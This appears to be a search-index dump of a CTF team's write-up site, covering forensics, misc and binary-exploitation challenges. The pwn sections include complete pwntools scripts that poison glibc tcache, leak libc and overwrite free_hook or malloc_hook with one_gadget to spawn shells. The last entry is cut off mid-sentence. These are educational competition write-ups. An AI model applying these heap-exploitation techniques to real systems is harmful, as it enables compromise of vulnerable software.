Goad"},{"location":"forensics/TJCTF/Rap God/Rap/#description","text":"My rapper friend Big Y sent me his latest track but something sounded a little off about it. Help me find out if he was trying to tell me something with it. Submit your answer as tjctf{message}","title":"Description"},{"location":"forensics/TJCTF/Rap God/Rap/#solution","text":"Open the given mp3 file using Sonic Visualiser. Using Spectrogram we see something like this. They are encoded images, but not clear. Let's examine the channel-2 in Spectrogram. Now, the encoded symbols are clear. After surfing through internet I came across this website which decodes similar images as in our case. Let's try decoding using this website. tjctf{quicksonic} We got the flag!","title":"Solution"},{"location":"misc/intro/","text":"Miscellaneous Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from the Misc category. The contents of this repo This repo contains the writeups of various challenges from CTFs we have attempted. HSCTF7 2020 Emojis - Sandhra Bino","title":"Miscellaneous"},{"location":"misc/intro/#miscellaneous","text":"","title":"Miscellaneous"},{"location":"misc/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from the Misc category.","title":"Introduction"},{"location":"misc/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of various challenges from CTFs we have attempted. HSCTF7 2020 Emojis - Sandhra Bino","title":"The contents of this repo"},{"location":"misc/DarkCTF/quick/","text":"Quickfix Description We were given 10000 images which had to be fixed/concatenated together to form one final image of png format even though the given images were with .jpg file extension and showed that it was curropted when you tried to execute it. So basically first we get all the images, and change the header by changing the first 8 bytes and replace it with the first 8 bytes of png files. Then we rename all the files by changing their file extensions and last but not the least we concatenate the images as a 100x100 matrix image using the PIL module in python. Solution Script from __future__ import print_function import os from PIL import Image def write_to(): files = os.listdir('./QuickFix') ims=Image.open('./QuickFix/'+files[0]+'') result = Image.new( RGB , (100*ims.width, 100*ims.height)) for i in range(100): for j in range(100): cur = Image.open('./QuickFix/'+'flag_{}_{}.png'.format(i,j)) result.paste(cur, (i*ims.width,j*ims.height)) result.save(os.path.expanduser('~/image.png')) def header_change(): for i in os.listdir('./QuickFix'): with open('./QuickFix/'+i, rb+ ) as image: f=image.read() b=bytearray(f) #print(b[:14]) b=b.replace(b[:14],b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\r') #print(b[:14]) image.seek(0) image.write(b) image.truncate() def rename_func(): for i in os.listdir('./QuickFix'): os.rename('./QuickFix/'+i, './QuickFix/'+i[:-4]+'.png') Solution Flag: Flag Image","title":"Quickfix"},{"location":"misc/DarkCTF/quick/#quickfix","text":"","title":"Quickfix"},{"location":"misc/DarkCTF/quick/#description","text":"We were given 10000 images which had to be fixed/concatenated together to form one final image of png format even though the given images were with .jpg file extension and showed that it was curropted when you tried to execute it. So basically first we get all the images, and change the header by changing the first 8 bytes and replace it with the first 8 bytes of png files. Then we rename all the files by changing their file extensions and last but not the least we concatenate the images as a 100x100 matrix image using the PIL module in python.","title":"Description"},{"location":"misc/DarkCTF/quick/#solution-script","text":"from __future__ import print_function import os from PIL import Image def write_to(): files = os.listdir('./QuickFix') ims=Image.open('./QuickFix/'+files[0]+'') result = Image.new( RGB , (100*ims.width, 100*ims.height)) for i in range(100): for j in range(100): cur = Image.open('./QuickFix/'+'flag_{}_{}.png'.format(i,j)) result.paste(cur, (i*ims.width,j*ims.height)) result.save(os.path.expanduser('~/image.png')) def header_change(): for i in os.listdir('./QuickFix'): with open('./QuickFix/'+i, rb+ ) as image: f=image.read() b=bytearray(f) #print(b[:14]) b=b.replace(b[:14],b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\r') #print(b[:14]) image.seek(0) image.write(b) image.truncate() def rename_func(): for i in os.listdir('./QuickFix'): os.rename('./QuickFix/'+i, './QuickFix/'+i[:-4]+'.png')","title":"Solution Script"},{"location":"misc/DarkCTF/quick/#solution","text":"Flag: Flag Image","title":"Solution"},{"location":"misc/HSCTF7/Emojis/","text":"Emojis - Misc HSCTF2020 Description This challenge was made using emojigram language which is an esolang made using Emojis. All that we need to do is repicate the code in python and generate the flag from it by reversing the code. Replicated Code The replicated code looked like this. But since there are conditional jumps and all that we are given is the output when the flag is given, we have no choice but to guess whether the jumps are taken or not inorder to obttain the desired input. And to achieve the same we played around with a few of the instructions and put together the possibilities to get the Flag. flag=[120, 66, 94, 114, 95, 69, 110, 125, 73, 78, 99, 52, 118] flag[9]=flag[9]+flag[1] flag[7]=flag[7]+flag[11] flag[2]=47 flag[4]=flag[4]+flag[11] flag[0]=flag[0]+flag[2] flag[8]=flag[8]-8 flag[6]=flag[6]+flag[8] flag[6]=flag[6]-flag[8] flag[6]=flag[6]-flag[8] flag[10]=flag[10]+8 flag[11]=flag[11]-1 flag[4]=flag[4]-flag[9] flag[3]=flag[3]-2 flag[2]=flag[2]-4 flag[0]=flag[0]-flag[11] flag[1]=flag[1]-flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]-flag[7] flag[3]=flag[12] flag[2]=flag[2]+8 flag[9]=flag[9]-flag[6] flag[2]=flag[2]+flag[4] #flag[1]==flag[5] #False flag[2]=flag[5] #flag[1]==flag[12] #False #flag[11]=flag[11]+flag[0] flag[12]=118 Solution Flag: flag{tr3v0r-pAck3p}","title":"Emojis - Misc HSCTF2020"},{"location":"misc/HSCTF7/Emojis/#emojis-misc-hsctf2020","text":"","title":"Emojis - Misc HSCTF2020"},{"location":"misc/HSCTF7/Emojis/#description","text":"This challenge was made using emojigram language which is an esolang made using Emojis. All that we need to do is repicate the code in python and generate the flag from it by reversing the code.","title":"Description"},{"location":"misc/HSCTF7/Emojis/#replicated-code","text":"The replicated code looked like this. But since there are conditional jumps and all that we are given is the output when the flag is given, we have no choice but to guess whether the jumps are taken or not inorder to obttain the desired input. And to achieve the same we played around with a few of the instructions and put together the possibilities to get the Flag. flag=[120, 66, 94, 114, 95, 69, 110, 125, 73, 78, 99, 52, 118] flag[9]=flag[9]+flag[1] flag[7]=flag[7]+flag[11] flag[2]=47 flag[4]=flag[4]+flag[11] flag[0]=flag[0]+flag[2] flag[8]=flag[8]-8 flag[6]=flag[6]+flag[8] flag[6]=flag[6]-flag[8] flag[6]=flag[6]-flag[8] flag[10]=flag[10]+8 flag[11]=flag[11]-1 flag[4]=flag[4]-flag[9] flag[3]=flag[3]-2 flag[2]=flag[2]-4 flag[0]=flag[0]-flag[11] flag[1]=flag[1]-flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]-flag[7] flag[3]=flag[12] flag[2]=flag[2]+8 flag[9]=flag[9]-flag[6] flag[2]=flag[2]+flag[4] #flag[1]==flag[5] #False flag[2]=flag[5] #flag[1]==flag[12] #False #flag[11]=flag[11]+flag[0] flag[12]=118","title":"Replicated Code"},{"location":"misc/HSCTF7/Emojis/#solution","text":"Flag: flag{tr3v0r-pAck3p}","title":"Solution"},{"location":"pwning/intro/","text":"Binary Exploitation Introduction \"Write about Pwn and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. De1CTF20 STL_Container - Shruti Dixit HSCTF20 StudySim - Shruti Dixit VolgaCTF20 Notepad-- - Shruti Dixit N1CTF20 EasyWrite - Shruti Dixit","title":"Binary Exploitation"},{"location":"pwning/intro/#binary-exploitation","text":"","title":"Binary Exploitation"},{"location":"pwning/intro/#introduction","text":"\"Write about Pwn and about the writeups\"","title":"Introduction"},{"location":"pwning/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. De1CTF20 STL_Container - Shruti Dixit HSCTF20 StudySim - Shruti Dixit VolgaCTF20 Notepad-- - Shruti Dixit N1CTF20 EasyWrite - Shruti Dixit","title":"The contents of this repo"},{"location":"pwning/De1CTF20/stl/","text":"STL_Container Solved by: Shruti (@rudyerudite) De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here\u2019s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache. To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It\u2019s a 64-bit non-stripped binary which requires libc 2.27. Let\u2019s checkout the typical menu of every heap challenge: STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit 1 1. add 2. delete 3. show 1 input data:aaa done! STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data. Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue. So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That\u2019s why I was able to allocate only 7 chunks. Getting the Leaks I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm\u2026 I\u2019d a heap in the unsorted bin which I\u2019d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap. This is how a structure of a node (in list) looked like: 0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node 0x5555555455000010: heap_addr_of_the_stored_content I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren\u2019t the earlier contents :). That\u2019s how I got the libc leak! Final Exploit I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell! Here\u2019s the final exploit for the code, mind you it\u2019s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself! from pwn import * #r = process('./stl_container') r = remote('206.189.186.98',18848) def callds(ds,opt,value,idx): r.sendlineafter( ,str(ds)) r.sendlineafter( ,str(opt)) if(opt == 1): r.sendlineafter( input data: ,value) print(r.recvline()) else: if((ds == 3 or ds == 4) and opt == 2): return r.sendlineafter( index?\\n ,str(idx)) if(ds ==2): print( lol ) print(r.recvline()) #payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90) #adding chunks to tcache callds(1,1,'a'*0x10,-1) callds(1,1,'b'*0x10,-1) callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(3,1,'e'*0x10,-1) callds(3,1,'f'*0x10,-1) callds(4,1,'g'*0x10,-1) payload = p64(0xa1)*0x6 + p64(0x0) callds(4,1,payload,-1) #deleting chunks; unsorted bin callds(1,2,-1,0) callds(1,2,-1,1) callds(2,2,-1,0) callds(2,2,-1,0) callds(3,2,-1,0) callds(3,2,-1,1) callds(4,2,-1,0) callds(4,2,-1,1) #getting heap leaks callds(1,1,'',-1) callds(1,3,'',1) print(r.recvline()) leak = u64(( \\x70 +r.recvline().strip()).ljust(8,'\\x00')) print(hex(leak)) #getting libc leaks chunk = p64(leak -0x3f0) callds(3,1,'',-1) callds(3,1,chunk,-1) callds(4,1,'/bin/sh',-1) payload = p64(leak+0xa0) callds(4,1,payload,-1) callds(1,3,'',0) leak = u64(r.recvline().strip().split( : )[1].ljust(8,'\\x00')) print(hex(leak)) libc_base = leak - 0x3ebca0 system = libc_base + 0x4f440 malloc_hook = libc_base + 0x3ebc30 free_hook = libc_base + 0x3ed8e8 one_gadget = libc_base + 0x4f322 #final overwrite callds(1,2,-1,0) callds(1,2,-1,0) callds(3,2,-1,0) #to cause a loop callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(2,2,-1,0) callds(2,2,-1,0) payload = p64(free_hook) callds(2,1,payload,-1) callds(3,1,p64(one_gadget),-1) #gdb.attach(r) r.interactive() ##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}","title":"STL_Container"},{"location":"pwning/De1CTF20/stl/#stl_container","text":"Solved by: Shruti (@rudyerudite) De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here\u2019s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache. To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It\u2019s a 64-bit non-stripped binary which requires libc 2.27. Let\u2019s checkout the typical menu of every heap challenge: STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit 1 1. add 2. delete 3. show 1 input data:aaa done! STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data. Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue. So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That\u2019s why I was able to allocate only 7 chunks.","title":"STL_Container"},{"location":"pwning/De1CTF20/stl/#getting-the-leaks","text":"I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm\u2026 I\u2019d a heap in the unsorted bin which I\u2019d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap. This is how a structure of a node (in list) looked like: 0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node 0x5555555455000010: heap_addr_of_the_stored_content I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren\u2019t the earlier contents :). That\u2019s how I got the libc leak!","title":"Getting the Leaks"},{"location":"pwning/De1CTF20/stl/#final-exploit","text":"I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell! Here\u2019s the final exploit for the code, mind you it\u2019s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself! from pwn import * #r = process('./stl_container') r = remote('206.189.186.98',18848) def callds(ds,opt,value,idx): r.sendlineafter( ,str(ds)) r.sendlineafter( ,str(opt)) if(opt == 1): r.sendlineafter( input data: ,value) print(r.recvline()) else: if((ds == 3 or ds == 4) and opt == 2): return r.sendlineafter( index?\\n ,str(idx)) if(ds ==2): print( lol ) print(r.recvline()) #payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90) #adding chunks to tcache callds(1,1,'a'*0x10,-1) callds(1,1,'b'*0x10,-1) callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(3,1,'e'*0x10,-1) callds(3,1,'f'*0x10,-1) callds(4,1,'g'*0x10,-1) payload = p64(0xa1)*0x6 + p64(0x0) callds(4,1,payload,-1) #deleting chunks; unsorted bin callds(1,2,-1,0) callds(1,2,-1,1) callds(2,2,-1,0) callds(2,2,-1,0) callds(3,2,-1,0) callds(3,2,-1,1) callds(4,2,-1,0) callds(4,2,-1,1) #getting heap leaks callds(1,1,'',-1) callds(1,3,'',1) print(r.recvline()) leak = u64(( \\x70 +r.recvline().strip()).ljust(8,'\\x00')) print(hex(leak)) #getting libc leaks chunk = p64(leak -0x3f0) callds(3,1,'',-1) callds(3,1,chunk,-1) callds(4,1,'/bin/sh',-1) payload = p64(leak+0xa0) callds(4,1,payload,-1) callds(1,3,'',0) leak = u64(r.recvline().strip().split( : )[1].ljust(8,'\\x00')) print(hex(leak)) libc_base = leak - 0x3ebca0 system = libc_base + 0x4f440 malloc_hook = libc_base + 0x3ebc30 free_hook = libc_base + 0x3ed8e8 one_gadget = libc_base + 0x4f322 #final overwrite callds(1,2,-1,0) callds(1,2,-1,0) callds(3,2,-1,0) #to cause a loop callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(2,2,-1,0) callds(2,2,-1,0) payload = p64(free_hook) callds(2,1,payload,-1) callds(3,1,p64(one_gadget),-1) #gdb.attach(r) r.interactive() ##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}","title":"Final Exploit"},{"location":"pwning/HSCTF20/studysim/","text":"Studysim This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let\u2019s check it out! Along, with the challenge binary we were provided with Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it. Carrying out the initial checksec step, we get the following information on the mitigations: Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Full So possibly some overwrite on any of the hooks? A possible FSOP? Let\u2019s explore! The menu function which we are presented with: Welcome to study simulator! Because who has free time when you must STUDY. Commands: add - Adds a worksheet onto your stack of worksheets do - Complete the top worksheets sleep - Give up and sleep Add Let\u2019s us create a new chunk of any size below 0x400 and then the allocated chunk\u2019s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable. stack[allocated_count ++] = address of the allocated chunk After this we can give some content and it prints back the content which we have just added. Do Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like: 0x404020 stdout@@GLIBC_2.2.5 : 0x00007ffff7fc6760 0x0000000000000000 0x404030 stdin@@GLIBC_2.2.5 : 0x00007ffff7fc5a00 0x0000000000000000 0x404040 allocated_count : 0x0000000000000000 0x0000000000000000 0x404050: 0x0000000000000000 0x0000000000000000 0x404060 stack : 0x0000000000000000 0x0000000000000000 0x404070 stack+16 : 0x0000000000000000 0x0000000000000000 0x404080 stack+32 : 0x0000000000000000 0x0000000000000000 0x404090 stack+48 : 0x0000000000000000 0x0000000000000000 Sleep Well, it just sleeps and exits. Nothing interesting here. Getting the Leaks To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks. You throw the worksheet '0@@' on your stack of worksheets. For the libc leaks, well it won\u2019t be that easy as there\u2019s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure. I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won\u2019t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it. By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it\u2019s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored! 0x1553000: 0x0000000000000000 0x0000000000000251 -- Tcache struct begins 0x1553010: 0x000000000155327f 0x0000000000000000 -- First 8 bytes overwritten with count 0x1553020: 0x0000000000000000 0x0000000000000000 0x1553030: 0x0000000000000000 0x0000000000000000 0x1553040: 0x0000000000000000 0x0000000000000000 0x1553050: 0x0000000000404030 0x0000000000000000 -- Next chunk in line for allocation 0x1553060: 0x0000000000000000 0x0000000000000000 Final Exploit By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to malloc_hook . On the next call to malloc() function we would get an allocation on malloc_hook (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!! from pwn import * bss_stack = 0x404060 #k = process( ./studysim ,env = { LD_PRELOAD : ./libc.so.6 }) k = remote('pwn.hsctf.com', 5007) def add(size,content): k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(size)) k.sendlineafter( worksheet?\\n ,content) def do(count): k.sendlineafter( , do ) k.sendlineafter( finish?\\n ,str(count)) def sleep(): k.sendlineafter( , sleep ) stdout_bss = 0x0000000000404030 #heap leaks do(4) add(0x10,'a'*0x10) do(0) k.recvuntil( Only ) heap_leak = int(k.recvline().strip().split( )[0],10)-1 print(hex(heap_leak)) do(heap_leak) #get a count chunk = heap_leak-0x250-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x10,'c'*0x10) do(diff/8+1) #allocate a chunk at .bss addr of stdin chunk = heap_leak-0x208-0x10 diff = -bss_stack+chunk do(-diff/8) add(0x10,p64(stdout_bss)) do(diff/8+1) add(0x08,'') k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(0x8)) k.sendlineafter( worksheet?\\n ,'a') k.recvuntil( worksheet ) leak = k.recvline().strip().split( )[0].replace( ' , ) leak = '\\x00'+leak[1:] leak = u64(leak.ljust(8,'\\x00')) libc_base = leak-0x1e4a00 print(hex(libc_base)) do(3) #allocate chunk at __malloc_hook malloc_hook = libc_base + 0x0000000001e4c30 system = libc_base + 0x0000000000052fd0 one_gadget = libc_base + 0xe2383 chunk = heap_leak-0x208-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x20,p64(malloc_hook)) do(diff/8+1) add(0x08,'') k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(0x8)) k.sendlineafter( worksheet?\\n ,p64(one_gadget)) do(2) #call system k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,'0') k.interactive()","title":"Studysim"},{"location":"pwning/HSCTF20/studysim/#studysim","text":"This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let\u2019s check it out! Along, with the challenge binary we were provided with Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it. Carrying out the initial checksec step, we get the following information on the mitigations: Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Full So possibly some overwrite on any of the hooks? A possible FSOP? Let\u2019s explore! The menu function which we are presented with: Welcome to study simulator! Because who has free time when you must STUDY. Commands: add - Adds a worksheet onto your stack of worksheets do - Complete the top worksheets sleep - Give up and sleep","title":"Studysim"},{"location":"pwning/HSCTF20/studysim/#add","text":"Let\u2019s us create a new chunk of any size below 0x400 and then the allocated chunk\u2019s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable. stack[allocated_count ++] = address of the allocated chunk After this we can give some content and it prints back the content which we have just added.","title":"Add"},{"location":"pwning/HSCTF20/studysim/#do","text":"Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like: 0x404020 stdout@@GLIBC_2.2.5 : 0x00007ffff7fc6760 0x0000000000000000 0x404030 stdin@@GLIBC_2.2.5 : 0x00007ffff7fc5a00 0x0000000000000000 0x404040 allocated_count : 0x0000000000000000 0x0000000000000000 0x404050: 0x0000000000000000 0x0000000000000000 0x404060 stack : 0x0000000000000000 0x0000000000000000 0x404070 stack+16 : 0x0000000000000000 0x0000000000000000 0x404080 stack+32 : 0x0000000000000000 0x0000000000000000 0x404090 stack+48 : 0x0000000000000000 0x0000000000000000","title":"Do"},{"location":"pwning/HSCTF20/studysim/#sleep","text":"Well, it just sleeps and exits. Nothing interesting here.","title":"Sleep"},{"location":"pwning/HSCTF20/studysim/#getting-the-leaks","text":"To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks. You throw the worksheet '0@@' on your stack of worksheets. For the libc leaks, well it won\u2019t be that easy as there\u2019s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure. I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won\u2019t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it. By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it\u2019s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored! 0x1553000: 0x0000000000000000 0x0000000000000251 -- Tcache struct begins 0x1553010: 0x000000000155327f 0x0000000000000000 -- First 8 bytes overwritten with count 0x1553020: 0x0000000000000000 0x0000000000000000 0x1553030: 0x0000000000000000 0x0000000000000000 0x1553040: 0x0000000000000000 0x0000000000000000 0x1553050: 0x0000000000404030 0x0000000000000000 -- Next chunk in line for allocation 0x1553060: 0x0000000000000000 0x0000000000000000","title":"Getting the Leaks"},{"location":"pwning/HSCTF20/studysim/#final-exploit","text":"By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to malloc_hook . On the next call to malloc() function we would get an allocation on malloc_hook (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!! from pwn import * bss_stack = 0x404060 #k = process( ./studysim ,env = { LD_PRELOAD : ./libc.so.6 }) k = remote('pwn.hsctf.com', 5007) def add(size,content): k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(size)) k.sendlineafter( worksheet?\\n ,content) def do(count): k.sendlineafter( , do ) k.sendlineafter( finish?\\n ,str(count)) def sleep(): k.sendlineafter( , sleep ) stdout_bss = 0x0000000000404030 #heap leaks do(4) add(0x10,'a'*0x10) do(0) k.recvuntil( Only ) heap_leak = int(k.recvline().strip().split( )[0],10)-1 print(hex(heap_leak)) do(heap_leak) #get a count chunk = heap_leak-0x250-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x10,'c'*0x10) do(diff/8+1) #allocate a chunk at .bss addr of stdin chunk = heap_leak-0x208-0x10 diff = -bss_stack+chunk do(-diff/8) add(0x10,p64(stdout_bss)) do(diff/8+1) add(0x08,'') k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(0x8)) k.sendlineafter( worksheet?\\n ,'a') k.recvuntil( worksheet ) leak = k.recvline().strip().split( )[0].replace( ' , ) leak = '\\x00'+leak[1:] leak = u64(leak.ljust(8,'\\x00')) libc_base = leak-0x1e4a00 print(hex(libc_base)) do(3) #allocate chunk at __malloc_hook malloc_hook = libc_base + 0x0000000001e4c30 system = libc_base + 0x0000000000052fd0 one_gadget = libc_base + 0xe2383 chunk = heap_leak-0x208-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x20,p64(malloc_hook)) do(diff/8+1) add(0x08,'') k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(0x8)) k.sendlineafter( worksheet?\\n ,p64(one_gadget)) do(2) #call system k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,'0') k.interactive()","title":"Final Exploit"},{"location":"pwning/N1CTF20/easywrite/","text":"EasyWrite The past weekend I played N1CTF along with my teammates, I ended up spending most of the time in EasyWrite and Signin. In this writeup I\u2019ll be explaining about my approach for the EasyWrite, so let\u2019s get started! Initial Click All the useful mitigation are enabled other than FORTIFY. Also, the libc version required is libc-2.31. In a nutshell, the binary does the follows: Gives us the libc leak directly We can input 0x299 bytes which is stored on the heap [chunk1] Asks us to enter an address [addr1] where contents of chunk1 are copied to Allocated a chunk of size 0x30 [chunk2]. We can write 0x2f bytes to this chunk. chunk2 is freed. From this I could deduce that overwriting free_hook could be the key. But it wasn\u2019t really that easy. What did not work? On the first try, I gave addr1 as free_hook_ and the contents of chunk1 as address of system/ shellcode what not. I ended up with a SIGSEV because this was bound not to work as the binary was executing the chunk1 address and NX was enabled. I couldn\u2019t find any other targets for a long while. Another thing to try out was the controlling tcache structure because we could utilize the write happening on chunk2. Basically, we had to control malloc to help us in getting an arbitrary write. How about getting an allocation on free_hook_ and then overwriting it to get a shell? Not that easy. Crux: Controlling Tcache We know that it\u2019s the tcache_perthread_struct (stored on the heap) which kind of keeps a track of the count of chunks are present in the bin and also which one to be recycled on the next call. But in the present scenario we cannot control it because we do not have any way to get heap leaks but we have the libc leaks. Is there any way to control this region if we are armed only with libc leaks? I found a mmap\u2019d address which stores the pointer to the [tcache_perthread structure] -0x10 address. If we could overwrite this address with a chunk1 which has our fake tcache_structure (where the next 0x30 size chunk to be recycled is our free_hook_) then we could get the desired arbitrary write. In my understanding this mmap region is the global Tcache pointer which stores the pointer to the tcache structure (one stored on heap). More details can be found on another writeup on the same which gives a detailed understanding: https://ctftime.org/writeup/24295 . What happened next? Unfortunately, I was not able to complete the challenge during the CTF. Here, none of the one_gadgets come to handy so one must overwrite free_hook_ with system but then it would call free(system) = system(system) which is really not what we desire. My teammate and I did a lot of tries on this but found it out very late that one could get the arbitrary write at free_hook -0x8 and 